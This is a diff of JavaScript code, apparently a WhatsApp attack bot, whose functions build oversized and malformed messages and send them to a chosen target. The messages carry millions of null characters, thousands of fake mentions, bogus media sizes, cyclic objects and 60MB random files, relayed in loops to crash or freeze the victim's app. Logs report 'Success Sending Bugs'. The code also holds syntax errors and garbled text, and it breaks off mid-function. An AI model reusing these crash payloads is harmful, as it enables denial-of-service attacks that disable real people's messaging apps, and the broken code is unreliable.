-      font: Math.floor(Math.random() * 99999999),
-      background:
-        "#" +
-        Math.floor(Math.random() * 16777215)
-          .toString(16)
-          .padStart(6, "999999"),
-    }
-  );
-
-  const mediaData = [
-    {
-      ID: "68917910",
-      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
-      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
-      sid: "5e03e0",
-      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
-      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
-    },
-    {
-      ID: "68884987",
-      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
-      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
-      sid: "5e03e0",
-      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
-      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
-    },
-  ];
-
-  let sequentialIndex = 0;
-  console.log(chalk.red(`𝗟𝘂𝗻𝗼𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴 ${target}`));
-
-  const selectedMedia = mediaData[sequentialIndex];
-  sequentialIndex = (sequentialIndex + 1) % mediaData.length;
-
-  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia;
-
-  const contextInfo = {
-    participant: target,
-    mentionedJid: [
-      target,
-      ...Array.from(
-        { length: 300 },
-        () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
-      ),
-    ],
-  };
-
-  const stickerMsg = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
-          fileSha256: SHA256,
-          fileEncSha256: ENCSHA256,
-          mediaKey: mkey,
-          mimetype: "image/webp",
-          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
-          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
-          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: true,
-          contextInfo,
-          isAvatar: false,
-          isAiSticker: false,
-          isLottie: false,
-        },
-      },
-    },
-  };
-
-  const msgxay = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: "\x10".repeat(1045000),
-            version: 3,
-          },
-          entryPointConversionSource: "galaxy_message",
-        },
-      },
-    },
-  };
-
-  const msgxayy = {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "蟽骗伪讗 搔伪喙€", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "call_permission_request",
-            paramsJson: "\x10".repeat(1045000),
-            version: 3,
-          },
-          entryPointConversionSource: "galaxy_message",
-        },
-      },
-    },
-  };
-
-  let interxnxx = await generateWAMessageFromContent(target, {
-    buttonsMessage: {
-      text: "馃└",
-      contentText: "饾檮饾櫍饾檻饾櫈饾櫒 饾檴饾櫓饾櫀饾櫗",
-      footerText: "InvisibleHard嗉?",
-      buttons: [
-        {
-          buttonId: ".bugs",
-          buttonText: {
-            displayText: "\u0000".repeat(800000),
-          },
-          type: 1,
-        },
-      ],
-      headerType: 1,
-    },
   }, {});
-
-  const statusMessages = [stickerMsg, msgxay, msgxayy];
-
-  const content = {
-    extendedTextMessage: {
-      text: "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "軎?".repeat(30000),
-      matchedText: "軎?".repeat(20000),
-      description: "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴",
-      title: "軎?".repeat(20000),
-      previewType: "NONE",
-      jpegThumbnail:
-        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
-      inviteLinkGroupTypeV2: "DEFAULT",
-      contextInfo: {
-        isForwarded: true,
-        forwardingScore: 9999,
-        participant: target,
-        remoteJid: "status@broadcast",
-        mentionedJid: [
-          "0@s.whatsapp.net",
-          ...Array.from(
-            { length: 300 },
-            () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-          ),
-        ],
-        quotedMessage: {
-          newsletterAdminInviteMessage: {
-            newsletterJid: "pinzy@newsletter",
-            newsletterName:
-              "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "軎?".repeat(10000),
-            caption:
-              "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" +
-              "軎?".repeat(60000) +
-              "釤勧煗".repeat(60000),
-            inviteExpiration: "999999999",
-          },
-        },
-        forwardedNewsletterMessageInfo: {
-          newsletterName:
-            "飧欋祾岬椺祪耍薪慰蠅 伪褟褦 纬慰蠀?驴" + "鈨濌櫚隀瓣櫚".repeat(10000),
-          newsletterJid: "120363424874566521@newsletter",
-          serverId: 1,
-        },
-      },
-    },
-  };
-
-  const xnxxmsg = generateWAMessageFromContent(target, content, {});
-
-  for (let i = 0; i < 100; i++) {
-    await client.relayMessage("status@broadcast", xnxxmsg.message, {
-      messageId: xnxxmsg.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
-            },
-          ],
-        },
-      ],
-    });
-
-    await client.relayMessage("status@broadcast", interxnxx.message, {
-      messageId: interxnxx.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
-            },
-          ],
-        },
-      ],
-    });
-
-    await client.relayMessage("status@broadcast", biji2.message, {
-      messageId: biji2.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [{ tag: "to", attrs: { jid: target }, content: [] }],
-            },
-          ],
-        },
-      ],
-    });
-
-    for (const content of statusMessages) {
-      const msg = generateWAMessageFromContent(target, content, {});
-      await client.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: {},
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
-              },
-            ],
-          },
-        ],
-      });
-    }
-
-    if (i < 99) {
-      await new Promise((resolve) => setTimeout(resolve, 4000));
-    }
-  }
-
-  if (mention) {
-    await client.relayMessage(
-      target,
-      {
-        groupStatusMentionMessage: {
-          message: {
-            protocolMessage: {
-              key: xnxxmsg.key,
-              type: 25,
-            },
-          },
-        },
-      },
-      {
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: {
-              is_status_mention: " meki - melar ",
-            },
-            content: undefined,
-          },
-        ],
-      }
-    );
-  }
+  
+  let maklu = {};
+  maklu.a = maklu;
+  
+  await client.relayMessage(target, {
+    sendPaymentMessage: { noteMessage: maklu }
+  }, {});
 }
 
-async function LunoxRowrr(target) {
-const msg = {
-listMessage: {
-title: "\u0000",
-description: "\u0000",
-buttonText: "\u0000",
-footerText: "\u0000",
-listType: 1,
-sections: [
-{
-title: "\u0000",
-rows: [
-{
-title: "\u0000".repeat(90000),
-description: "ꦽ".repeat(90000),
-rowId: "Lunox"
-},
-{
-title: "\x10".repeat(90000),
-description: "\u0000".repeat(90000),
-rowId: "pay"
-},
-{
-title: "\u0000".repeat(90000),
-description: "ြ".repeat(90000),
-rowId: "loc"
-},
-{
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "xix"
-}, 
-{
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "nah"
-},
- {
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000),
-rowId: "x"
-},
-{
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "ix"
-},
- {
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "nu"
-},
-{
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "hah"
-},
- {
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "hih"
-},
-{
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "LunoxPrime"
-},
- {
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "hoh"
-}, 
-{
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "nigga"
-}, 
-{
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "Pinzy"
-},
- {
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "Lunox"
-},
- {
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "qwerty"
-},
- {
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "tq"
-},
- {
-title: "\u0000".repeat(90000), 
-description: "\x10".repeat(90000), 
-rowId: "bosq"
-}, 
-{
-title: "LunoxAttack",
-description: "\u0000".repeat(90000),
-rowId: "who"
-}
-]
-}
-]
-}
-}
-await client.relayMessage(target, msg, {
-participant: target, 
-messageId: msg.key.id
-})
+async function ForceInvisions(target) {
+  const stikerMessage = {
+   groupStatusMessageV2: {
+     message: {
+       stickerMessage: {
+         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+         mimetype: "image/webp",
+         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+         fileLength: "10610",
+         mediaKeyTimestamp: "1775044724",
+         stickerSentTs: "1775044724091"
+         }
+       }
+     }
+  }
+  
+  const msg = generateWAMessageFromContent(target, stikerMessage, {});
+
+  await client.relayMessage(target, {
+    groupStatusMessageV2: {
+    message: msg.message
+  }},
+  {
+   messageId: msg.key.id,
+   participant: { jid: target }
+  });
+  await new Promise((r) => setTimeout(r, 400));
 }
 
-async function chatFrezzeLunox(target) {
-const fakeKey = {
-    "remoteJid": target,
-    "fromMe": true,
-    "id": await client.relayMessage(target, {
-        "albumMessage": {
-            "expectedImageCount": -99999999,
-            "expectedVideoCount": 0,
-            "caption": "x"
-        }
-    },{})
-}
-
-let xx = {
-  "url": "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
-  "mimetype": "image/jpeg",
-  "fileSha256": "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
-  "fileLength": "164089",
-  "height": 9999,
-  "width": 9999,
-  "mediaKey": "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
-  "fileEncSha256": "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
-  "directPath": "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0"
-}
-
-for (let s = 0; s < 5; s++) {
-const xy = generateWAMessageFromContent(target, proto.Message.fromObject({
-"botInvokeMessage": {
-"message": {
-    "messageContextInfo": {
-        "deviceListMetadata": {},
-        "deviceListMetadataVersion": 2,
-        "supportPayload": JSON.stringify({
-            "version": 2,
-            "is_ai_message": true,
-            "should_show_system_message": true,
-            "ticket_id": crypto.randomBytes(16)
-          }),
-        "messageSecret": (0, crypto.randomBytes)(32),
-        "messageAssociation": {
-            "associationType": "MEDIA_ALBUM",
-            "parentMessageKey": fakeKey
-        }
-    },
-"imageMessage": xx
-}
-}
-}),{ participant: { jid: target }})
-
-const xz = await client.relayMessage(target, xy.message, {messageId:xy.key.id})
-
-xx.caption = "ꦾ".repeat(100000);
-
-  client.relayMessage(target, {
-    protocolMessage: {
-      type: "MESSAGE_EDIT",
-      key: {
-        fromMe: true,
-        remoteJid: target,
-        id: xz
-      },
-      editedMessage: {
-        imageMessage: xx
-      }
-    }
-  }, { participant: { jid: target }})
-await sleep(100)
-}
-}
-
-async function LunoxPrikitiw(target) {
-
-  const msg = await generateWAMessageFromContent(
+async function DileyHarddd(target) {
+  const msg = generateWAMessageFromContent(
     target,
     {
-      viewOnceMessage: {
+      ephemeralMessage: {
         message: {
           interactiveMessage: {
-            body: {
-              text: "\0"
+            header: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
+                mimetype: "image/jpeg",
+                fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
+                fileLength: "999999999999999",
+                height: 99999,
+                width: 99999,
+                mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
+                fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
+                directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
+                mediaKeyTimestamp: "1755695348",
+                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
+                mediaKeyTimestamp: Math.floor(Date.now() / 1000).toString(),
+                contactVcard: true,
+                thumbnailDirectPath: `/v/t62.36145-24/${Math.floor(Math.random() * 1e18)}_${Math.floor(Math.random() * 1e18)}_n.enc?ccb=11-4&oh=${Math.random().toString(36).substring(2, 15)}&oe=${Math.random().toString(36).substring(2, 10)}&_nc_sid=${Math.random().toString(36).substring(2, 6)}`,
+                thumbnailSha256: Buffer.from(crypto.randomBytes(32)).toString("base64"),
+                thumbnailEncSha256: Buffer.from(crypto.randomBytes(32)).toString("base64"),
+                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
+                thumbnailHeight: Math.floor(Math.random() * 1080),
+                thumbnailWidth: Math.floor(Math.random() * 1920)
+              },
+              hasMediaAttachment: true
             },
-            footer: {
-              text: "\0"
+            body: {
+              text: " Lunox - Execute "
+            },
+            urlTrackingMap: {
+              urlTrackingMapElements: [
+                {
+                  originalUrl: "https://t.me/Pinnxyx",
+                  unconsentedUsersUrl: "https://t.me/Pinnxyz",
+                  consentedUsersUrl: "https://t.me/Pinnxyz",
+                  cardIndex: 1
+                },
+                {
+                  originalUrl: "https://t.me/Pinnxyz",
+                  unconsentedUsersUrl: "https://t.me/Pinnxyz",
+                  consentedUsersUrl: "https://t.me/Pinnxyz",
+                  cardIndex: 2
+                }
+              ]
             },
             nativeFlowMessage: {
               buttons: [
-                {
-                  name: "galaxy_message",
-                  buttonParamsJson: JSON.stringify({
-                    icon: "DOCUMENT",
-                    flow_cta: "ꦽ".repeat(90000),
-                    flow_message_version: "3"
-                  })
+                { 
+                  name: "single_select", 
+                  buttonParamsJson: "X" 
                 },
-                {
-                  name: "wa_payment_transaction_details",
-                  buttonParamsJson: JSON.stringify({
-                    transaction_id: "AXD-" + Date.now() + "ꦽ".repeat(90000)
-                  })
+                { 
+                  name: "galaxy_message", 
+                  buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
                 },
-                {
-                  name: "send_location",
-                  buttonParamsJson: JSON.stringify({
-                    location_name: "ꦽ".repeat(70000),
-                    latitude: 1e308,
-                    longitude: 1e308
-                  })
+                { 
+                  name: "call_permission_message", 
+                  buttonParamsJson: "\x10".repeat(10000)
                 }
               ],
-              messageParamsJson: "wa.me/stickerpack/whatsapp",
-              messageVersion: 1
+              messageParamsJson:
+                " kelra - execute " +
+                "\u0000".repeat(900000)
+            },
+            contextInfo: {
+              mentionedJid: [
+                "0@s.whatsapp.net",
+          ...Array.from(
+            { length: 1900 },
+            () =>
+              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+              ],
+              forwardingScore: 999999,
+              isForwarded: true,
+              fromMe: false,
+              participant: "0@s.whatsapp.net",
+              remoteJid: "status@broadcast",
+              quotedMessage: { 
+                conversation: " X " 
+              }
             }
           }
         }
@@ -1662,96 +388,340 @@ async function LunoxPrikitiw(target) {
     {}
   )
 
-  await client.relayMessage(
-    target,
-    msg.message,
-    {
-      messageId: msg.key.id
-    }
-  )
-}
+  await client..relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
 
-async function pukiMax(target) {
-  try {
-    const pukiMax = {
-      interactiveResponseMessage: {
-        body: {
-          text: "i'm back baby, LunoxAttack",
-          format: "DEFAULT"
-        },
-        nativeFlowResponseMessage: {
-          name: "galaxy_message",
-          paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
-          version: 3
-        },
-        nativeFlowResponseMessageV2: {
-          name: "address_message",
-          paramsJson: `{"values":{"in_pin_code":"999999","building_name":"VnX","landmark_area":"18","address":"P0K3","tower_number":"P0k3","city":"tobrut","name":"p0k3","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X${"\u0000".repeat(900000)}"}}`,
-          version: 3
-        },
-        nativeFlowResponseMessageV3: {
-          name: "menu_options",
-          paramsJson: `{"display_text":"${"\u0000".repeat(900000)}","description":"${"\u0000".repeat(90000)}","id":"crash"}`,
-          version: 3
-        },
-        contextInfo: {
-          ephemeralExpiration: 0,
-          forwardingScore: 99999999,
-          isForwarded: true,
-          font: Math.floor(Math.random() * 99999999),
-          background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
-          mentionedJid: Array.from({ length: 3000 }, () =>
-            Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
-          )
+  await client.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              { tag: "to", attrs: { jid: target }, content: undefined }
+            ]
+          }
+        ]
+      }
+    ]
+  })
+
+  if (msg) {
+    await client.relayMessage(target, {
+      statusMentionMessage: {
+        message: {
+          protocolMessage: {
+            key: msg.key,
+            type: 25
+          }
         }
       }
-    };
-
-    await client.relayMessage(target, pukiMax, {
-      participant: { jid: target }
-    });
-
-    console.log(`- Success Sending Bugs to ${target}`);
-
-  } catch (err) {
-    console.error(`- Error Sending Bugs : ${err.message}`);
+    }, {})
   }
 }
 
-async function blankjembotlunox(target, Ptcp = true) {
-    await client.relayMessage(target, {
-        groupMentionedMessage: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        documentMessage: {
-                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
-                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
-                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
-                            fileLength: "9999999999999999",
-                            pageCount: 0x9184e729fff,
-                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
-                            fileName: "×‌×ʟᴜɴᴏx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒.",
-                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
-                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
-                            mediaKeyTimestamp: "1715880173",
-                            contactVcard: true
-                        },
-                        title: "⏳ Lunox Imcoming" ,
-                        hasMediaAttachment: true
-                    },
-                    body: {
-                        text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
-                    },
-                    nativeFlowMessage: {},
-                    contextInfo: {
-                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
-                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
-                    }
+async function StellarBriliance(client, target, type = 'RAM') {
+    const id = "🍟LUNOX VIP BY PinzyOfficial" + crypto.randomBytes(8).toString('hex').toUpperCase();
+    
+    const beatrixytzyy = crypto.randomBytes(1024 * 1024 * 60);
+    const invis = "\u200B".repeat(5000000); 
+    const gtw = " ॣ ॣ ॣ ".repeat(10000);
+    const bismillah = " ﷽ ".repeat(5000);
+    let briliance = invis + gtw + bismillah;
+
+    console.log(`🤓 ampas deck by @Pinnxyz : ${target}`);
+
+    try {
+        await client.sendMessage(target, {
+            document: beatrixytzyy,
+            mimetype: 'application/pdf',
+            fileName: `${id}.pdf`,
+            caption: `*PinzyYtzz — KynaX*${id}\n` + brilliance,
+
+            contextInfo: {
+                externalAdReply: {
+                    title: "nibiru, renner, wesker, bennett || Beatrix Function By Pinzy|Lunox",
+                    body: "StellarBriliance",
+                    mediaType: 1,
+                    renderLargerThumbnail: true,
+                    thumbnail: crypto.randomBytes(1024 * 200),
+                    sourceUrl: "https://wa.me/call/13135550002" // call meta a i
+                },
+                
+                forwardingScore: 1000,
+                isForwarded: true,
+                remoteJid: "120363424874566521@newsletter",
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: "120363424874566521@newsletter,
+                    serverMessageId: 1337,
+                    newsletterName: "Renner¿? By Pinzy"
+                },
+                
+                quotedMessage: {
+                    conversation: invisibleGhost.slice(0, 500000)
                 }
             }
+        }, { 
+            messageId: id,
+            ephemeralExpiration: 604800 
+        });
+
+        console.log(`#— 🍔 Succes Send Bug to ${target}`);
+
+    } catch (err) {
+        console.error(`#— 🛠️ Fixed sendiri, kan LU DEV!: ${err}`);
+        setTimeout(() => StellarBriliance(client, target, 'RAM'), 500);
+    }
+}
+
+async function DelayCrashJembut(target) {
+ try {
+  const Xylent = {
+   requestPhoneNumberMessage: {
+    body: {
+                text: "\u0000".repeat(2000000),
+                format: "DEFAULT"
+              },
+              nativeFlowResponseMessage: {
+                name: "request_phone_number",
+                paramsJson: `{"phone_number":"${"\u0000".repeat(3000000)}","country_code":"${"\u0000".repeat(500000)}","otp":"${"\u0000".repeat(1000000)}","validation":"${"\u0000".repeat(800000)}"}`,
+                version: 3
+              },
+              contextInfo: {
+                ephemeralExpiration: 0,
+                forwardingScore: 999999999,
+                isForwarded: true,
+                font: Math.floor(Math.random() * 99999999),
+                background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
+                mentionedJid: Array.from({ length: 8000 }, () => 
+                  Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
+                ),
+                statusAttributionType: 2,
+                statusAttributions: Array.from({ length: 2009990 }, (_, z) => ({
+                  type: 1
+                }))
+              }
+            }
+          }
         }
-    }, { participant: { jid: target } }, { messageId: null });    
+        
+    await client.relayMessage(target, Xylent, {
+      participant: { jid: target }
+    });
+    
+    console.log(`✅ Xylent Sukses Attack To: ${target}`);
+    
+  } catch (err) {
+    console.error(`❌ Error: ${err.message}`);
+  }
+}
+
+async function Killers(target) {
+  let str = '';
+  for (let i = 0; i < 500000; i++) str += 'X';
+  let Maklu = '';
+  for (let i = 0; i < 50000; i++) Maklu += 'ꦾ';
+  for (let i = 0; i < 50000; i++) Maklu += '𑜦𑜠';
+  for (let i = 0; i < 50000; i++) Maklu += 'ោ៝';
+  let Yatem = '';
+  for (let i = 0; i < 100000; i++) Yatem += '{';
+  let ejs = '';
+  for (let i = 0; i < 500000; i++) ejs += '\u0000';
+  let mention = [];
+  for (let i = 0; i < 30000; i++) {
